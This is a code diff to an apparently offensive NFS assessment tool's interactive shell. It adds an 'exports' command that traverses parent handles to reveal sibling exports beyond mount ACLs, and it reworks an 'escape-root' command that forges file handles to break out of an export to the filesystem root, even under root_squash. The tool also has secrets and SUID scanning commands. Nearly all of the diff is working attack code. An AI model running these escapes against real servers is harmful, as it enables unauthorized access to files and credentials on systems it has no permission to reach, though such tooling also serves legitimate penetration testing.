@@ -24,15 +24,14 @@ use sha2::{Digest, Sha256};
 
 use colored::Colorize as _;
 
-use crate::engine::file_handle::FileHandleAnalyzer;
-use crate::proto::nfs3::types::FileHandle;
+use crate::engine::escape::{EscapeConfig, EscapeProbe, EscapeRootOutcome, find_escape_root};
 use crate::util::utmp::{LastlogRecord, UTMP_RECORD_SIZE, UtType, UtmpRecord, parse_lastlog, parse_passwd, parse_utmp};
 
 /// Maximum bytes to read in a single `cat` command.
 const CAT_MAX_BYTES: u32 = 1_048_576; // 1 MiB
 
 /// Maximum bytes per NFS READ/WRITE chunk.
-const CHUNK_SIZE: u32 = 65_536; // 64 KiB
+use crate::shell::ops::{CHUNK_SIZE, READ_ALL_MAX};
 
 /// All commands available in the NFSv3 interactive shell (for Tab completion of the first token).
 pub(crate) const V3_SHELL_COMMANDS: &[&str] = &[
@@ -74,6 +73,7 @@ pub(crate) const V3_SHELL_COMMANDS: &[&str] = &[
     "suid-scan",
     "world-writable",
     "secrets-scan",
+    "exports",
     "last",
     "lastb",
     "lastlog",
@@ -133,6 +133,7 @@ pub(crate) const V4_SHELL_COMMANDS: &[&str] = &[
     "suid-scan",
     "world-writable",
     "secrets-scan",
+    "exports",
     "last",
     "lastb",
     "lastlog",
@@ -192,6 +193,7 @@ pub(crate) const V2_SHELL_COMMANDS: &[&str] = &[
     "suid-scan",
     "world-writable",
     "secrets-scan",
+    "exports",
     "last",
     "lastb",
     "lastlog",
@@ -224,6 +226,26 @@ pub(crate) struct NfsShell<O: ShellOps> {
     history: Vec<String>,
     tab_cache: Arc<Mutex<complete::TabCache>>,
     commands: &'static [&'static str],
+}
+
+/// Adapts `ShellOps` to the `EscapeProbe` trait so the shared escape engine
+/// can probe handles through the shell's NFS version backend.
+struct ShellEscapeProbe<'a, O: ShellOps> {
+    ops: &'a O,
+}
+
+impl<O: ShellOps> EscapeProbe for ShellEscapeProbe<'_, O> {
+    async fn probe_getattr(&self, handle: &[u8]) -> anyhow::Result<(bool, u64)> {
+        let fh = ShellHandle(handle.to_vec());
+        let info = self.ops.getattr(&fh).await?;
+        Ok((info.file_type == ShellFileType::Directory, info.fileid))
+    }
+
+    async fn probe_lookup(&self, dir: &[u8], name: &str) -> anyhow::Result<Vec<u8>> {
+        let fh = ShellHandle(dir.to_vec());
+        let (child, _) = self.ops.lookup(&fh, name).await?;
+        Ok(child.0)
+    }
 }
 
 impl<O: ShellOps> NfsShell<O> {
@@ -331,6 +353,7 @@ impl<O: ShellOps> NfsShell<O> {
             "suid-scan" => self.cmd_suid_scan().await,
             "world-writable" => self.cmd_world_writable().await,
             "secrets-scan" => self.cmd_secrets_scan().await,
+            "exports" => self.cmd_exports().await,
             "last" => self.cmd_last(arg, false).await,
             "lastb" => self.cmd_last(arg, true).await,
             "lastlog" => self.cmd_lastlog(arg).await,
@@ -1388,59 +1411,140 @@ impl<O: ShellOps> NfsShell<O> {
 
     /// Construct a filesystem-root escape handle from the current export handle.
     ///
-    /// Implements F-2.1: when subtree_check is disabled (Linux default), the server
-    /// only validates the fsid in the handle, not that the inode falls within the export.
-    /// By writing inode 2 (ext4/xfs) or subvol 256 (btrfs), we escape to the FS root.
-    async fn cmd_escape_root(&mut self) {
-        // Try every plausible filesystem-root candidate for the detected FS type
-        // (ext4 inode 2, XFS 128/64/32, BTRFS subvols) rather than a single guess,
-        // so a UUID-based XFS export is not silently limited to the ext4 root.
-        let export_fh = FileHandle::from_bytes(self.export_root.as_bytes());
-        let candidates = FileHandleAnalyzer::construct_root_candidates(&export_fh);
-        if candidates.is_empty() {
-            eprintln!("{}", "escape-root: unsupported filesystem type (ext4/xfs/btrfs only)".red());
-            return;
+    /// Discover reachable sibling exports via LOOKUPP traversal (F-2.12).
+    ///
+    /// Walks upward from the current directory via LOOKUP ".." until the handle
+    /// stabilizes (pseudo-root or filesystem root), then lists all children at
+    /// each level. On NFSv4, this reveals the full pseudo-FS tree including
+    /// exports the client may not have been granted via MOUNT ACLs.
+    async fn cmd_exports(&self) {
+        /// Safety cap on parent traversal depth.
+        const MAX_DEPTH: u32 = 32;
+        /// Maximum directory recursion depth when enumerating sub-exports.
+        const MAX_RECURSE: u32 = 4;
+
+        struct DirItem {
+            handle: ShellHandle,
+            path: String,
+            recurse_depth: u32,
         }
 
-        let mut last_err: Option<String> = None;
-        for result in candidates {
-            let candidate = ShellHandle(result.root_handle.as_bytes().to_vec());
-            match self.ops.getattr(&candidate).await {
-                Ok(info) => {
-                    // Only a directory is the filesystem root; a non-directory hit
-                    // is a real but wrong inode inside the export -- keep trying.
-                    if info.file_type != ShellFileType::Directory {
-                        continue;
-                    }
-                    eprintln!("{}", format!("[+] escaped to filesystem root ({:?}, inode {})", result.fs_type, result.inode_number).green().bold());
-                    eprintln!("{}", format!("    handle: {}", candidate.to_hex()).cyan());
-                    eprintln!("{}", format!("    inode: {}  type: {}  mode: {:04o}", info.fileid, info.type_name(), info.mode & 0o7777).cyan());
-                    // Rebase the session's notion of "/" so absolute lookups walk
-                    // the underlying filesystem root, not the narrow export.
-                    self.export_root = candidate.clone();
-                    self.cwd = candidate;
-                    self.cwd_path = String::from("/ [escaped]");
-                    self.refresh_tab_cache().await;
-                    return;
-                },
-                Err(e) => {
-                    let msg = format!("{e:#}");
-                    // Handle format accepted but root_squash blocks GETATTR -- the
-                    // escape worked; rebase and let credential escalation read.
-                    if msg.contains("NFS3ERR_ACCES") || msg.contains("NFS3ERR_PERM") || msg.contains("ACCES") || msg.contains("PERM") {
-                        eprintln!("{}", format!("[+] escaped to filesystem root ({:?}, inode {}) -- root_squash active, GETATTR denied", result.fs_type, result.inode_number).green().bold());
-                        eprintln!("{}", format!("    handle: {}", candidate.to_hex()).cyan());
-                        self.export_root = candidate.clone();
-                        self.cwd = candidate;
-                        self.cwd_path = String::from("/ [escaped]");
-                        self.refresh_tab_cache().await;
-                        return;
-                    }
-                    last_err = Some(msg);
-                },
+        eprintln!("{}", "Discovering reachable exports via parent traversal...".cyan());
+
+        let mut current = self.cwd.clone();
+        let mut path = self.cwd_path.clone();
+        let mut depth = 0u32;
+
+        // Walk up until handle stops changing (root is its own parent).
+        loop {
+            if depth >= MAX_DEPTH {
+                eprintln!("{}", "  hit depth cap -- stopping".yellow());
+                break;
+            }
+            let Ok((parent, _)) = self.ops.lookup_path(&current, "..").await else {
+                break;
+            };
+            if parent == current {
+                break;
+            }
+            current = parent;
+            depth += 1;
+            // Update path tracking
+            if path == "/" {
+                // already at root
+            } else if let Some(idx) = path.rfind('/') {
+                path = if idx == 0 { "/".to_owned() } else { path[..idx].to_owned() };
+            } else {
+                "/".clone_into(&mut path);
             }
         }
-        eprintln!("{}", format!("[!] no escape candidate resolved to the filesystem root (last error: {}) -- try `nfswolf escape` for the full inode scan", last_err.as_deref().unwrap_or("none")).yellow());
+
+        eprintln!("{}", format!("Reached top: {path} (depth {depth})").cyan());
+        eprintln!();
+
+        // Walk down from the top, listing directories at each level. On NFSv4
+        // the pseudo-FS tree typically has 2-3 levels (/, /srv, /srv/nfs) before
+        // reaching real exports. We recurse 4 levels deep to cover all layouts.
+        let mut export_count = 0u32;
+        let mut stack = vec![DirItem { handle: current, path, recurse_depth: 0 }];
+
+        while let Some(item) = stack.pop() {
+            let Ok(entries) = self.ops.list_dir(&item.handle).await else {
+                continue;
+            };
+
+            for entry in &entries {
+                if entry.name == "." || entry.name == ".." {
+                    continue;
+                }
+                let info = entry.info.as_ref();
+                if !info.is_some_and(|i| i.file_type == ShellFileType::Directory) {
+                    continue;
+                }
+
+                let child_handle = if let Some(ref h) = entry.handle {
+                    h.clone()
+                } else if let Ok((h, _)) = self.ops.lookup(&item.handle, &entry.name).await {
+                    h
+                } else {
+                    continue;
+                };
+
+                let full = format!("{}/{}", item.path.trim_end_matches('/'), entry.name);
+
+                if let Ok(children) = self.ops.list_dir(&child_handle).await {
+                    let count = children.iter().filter(|e| e.name != "." && e.name != "..").count();
+                    let uid = info.map_or(0, |i| i.uid);
+                    let mode = info.map_or(0, |i| i.mode);
+                    println!("  {}  {:<40} {:>3} entries  uid={}  mode={:04o}", "[+]".green().bold(), full, count, uid, mode);
+                    export_count += 1;
+                    // Recurse deeper to find sub-exports.
+                    if item.recurse_depth < MAX_RECURSE {
+                        stack.push(DirItem { handle: child_handle, path: full, recurse_depth: item.recurse_depth + 1 });
+                    }
+                } else {
+                    println!("  {}  {:<40} {}", "[!]".yellow(), full, "access denied".yellow());
+                    export_count += 1;
+                }
+            }
+        }
+
+        eprintln!();
+        eprintln!("{}", format!("{export_count} directories discovered").cyan());
+        if depth > 0 {
+            eprintln!("{}", format!("  traversed {depth} levels via LOOKUPP (F-2.12)").cyan());
+        }
+    }
+
+    /// Delegates to the shared escape engine (`engine::escape::find_escape_root`)
+    /// which covers ext4, XFS, BTRFS, ZFS, and a brute-force inode scan.
+    /// Implements F-2.1: when subtree_check is disabled (Linux default), the server
+    /// only validates the fsid in the handle, not that the inode falls within the export.
+    async fn cmd_escape_root(&mut self) {
+        let probe = ShellEscapeProbe { ops: &self.ops };
+        let config = EscapeConfig { announce: true, ..EscapeConfig::default() };
+
+        match find_escape_root(&probe, self.cwd.as_bytes(), &config).await {
+            EscapeRootOutcome::Success(result) => {
+                let handle = ShellHandle(result.root_handle.as_bytes().to_vec());
+                eprintln!("{}", format!("[+] escaped to filesystem root ({:?}, inode {})", result.fs_type, result.inode_number).green().bold());
+                eprintln!("{}", format!("    handle: {}", handle.to_hex()).cyan());
+                // Probe attrs for display
+                if let Ok(info) = self.ops.getattr(&handle).await {
+                    eprintln!("{}", format!("    inode: {}  type: {}  mode: {:04o}", info.fileid, info.type_name(), info.mode & 0o7777).cyan());
+                }
+                self.export_root = handle.clone();
+                self.cwd = handle;
+                self.cwd_path = String::from("/ [escaped]");
+                self.refresh_tab_cache().await;
+            },
+            EscapeRootOutcome::StaleNoRoot => {
+                eprintln!("{}", "[!] handle format valid (STALE hits) but root not found in scan range -- try nfswolf escape with --max-root-scan".yellow());
+            },
+            EscapeRootOutcome::Unsupported => {
+                eprintln!("{}", "escape-root: server rejected handle format (non-Linux or unsupported filesystem)".red());
+            },
+        }
     }
 
     /// Switch the current directory to an arbitrary file handle (hex).
@@ -1655,6 +1759,7 @@ impl<O: ShellOps> NfsShell<O> {
         println!("  suid-scan                  find SUID/SGID binaries");
         println!("  world-writable             find world-writable files");
         println!("  secrets-scan               find credential/secret files");
+        println!("  exports                    discover sibling exports via LOOKUPP (F-2.12)");
         println!("  last [N]                   decode /var/log/wtmp (login history; per util-linux 2.42 last.c)");
         println!("  lastb [N]                  decode /var/log/btmp (failed-login history)");
         println!("  lastlog                    decode /var/log/lastlog (last login per UID)");
@@ -1685,8 +1790,7 @@ impl<O: ShellOps> NfsShell<O> {
 /// Hard cap on a single in-memory read. The NFS server is untrusted; a hostile
 /// or buggy server can return endless non-EOF chunks, so `download_file` must bound
 /// its buffer instead of growing until OOM.
-const READ_ALL_MAX_BYTES: u64 = 256 * 1024 * 1024; // 256 MiB
-
+///
 /// Download `fh` to a local file path via ShellOps, reading in chunks.
 ///
 /// Returns `(bytes_written, sha256_hex)`.  The SHA-256 is computed over the
@@ -1704,8 +1808,8 @@ async fn download_file<O: ShellOps>(ops: &O, fh: &ShellHandle, dest_path: &str) 
         file.write_all(&data).map_err(|e| anyhow::anyhow!("write: {e}"))?;
         hasher.update(&data);
         offset = offset.saturating_add(data.len() as u64);
-        if offset > READ_ALL_MAX_BYTES {
-            anyhow::bail!("download aborted at {offset} bytes: exceeds {READ_ALL_MAX_BYTES}-byte cap (untrusted server returning endless non-EOF data)");
+        if offset > READ_ALL_MAX {
+            anyhow::bail!("download aborted at {offset} bytes: exceeds {READ_ALL_MAX}-byte cap (untrusted server returning endless non-EOF data)");
         }
     }
     let hash = hasher.finalize().iter().fold(String::with_capacity(64), |mut s, b| {
